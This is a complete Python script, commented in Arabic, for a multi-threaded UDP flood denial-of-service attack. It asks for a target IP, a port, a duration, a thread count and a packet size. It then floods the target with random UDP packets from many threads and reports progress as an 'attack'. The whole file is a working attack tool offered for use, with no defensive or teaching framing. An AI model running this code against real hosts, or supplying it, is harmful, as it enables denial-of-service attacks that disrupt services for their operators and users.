import socket
import random
import time
import threading

# وظيفة إرسال حزم UDP متعددة
def send_udp_packets(target_ip, target_port, packet_size, duration, client):
    timeout = time.time() + duration
    sent_packets = 0

    while time.time() < timeout:
        try:
            packet = random._urandom(packet_size)  # حزمة بيانات عشوائية
            client.sendto(packet, (target_ip, target_port))
            sent_packets += 1
            if sent_packets % 100 == 0:
                print(f"{sent_packets} packets sent to port {target_port}.")
        except Exception as e:
            print(f"Error: {e}")
            break

    print(f"Attack completed. Total packets sent: {sent_packets}")

def udp_flood(target_ip, target_port, duration, num_threads, packet_size):
    print(f"Starting UDP flood attack on {target_ip}:{target_port} for {duration} seconds...")
    
    threads = []
    
    # إنشاء وتوزيع العديد من الخيوط (Threads) لزيادة الكثافة
    for _ in range(num_threads):
        client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        thread = threading.Thread(target=send_udp_packets, args=(target_ip, target_port, packet_size, duration, client))
        threads.append(thread)
        thread.start()

    # الانتظار حتى تنتهي جميع الخيوط
    for thread in threads:
        thread.join()

if __name__ == "__main__":
    # المدخلات من المستخدم
    target_ip = input("Enter target IP: ")
    target_port = int(input("Enter target port: "))
    duration = int(input("Enter duration (in seconds): "))
    num_threads = int(input("Enter number of threads (higher for more power): "))
    packet_size = int(input("Enter packet size (higher for more impact): "))

    # بدء الهجوم مع تحسينات القوة
    udp_flood(target_ip, target_port, duration, num_threads, packet_size)
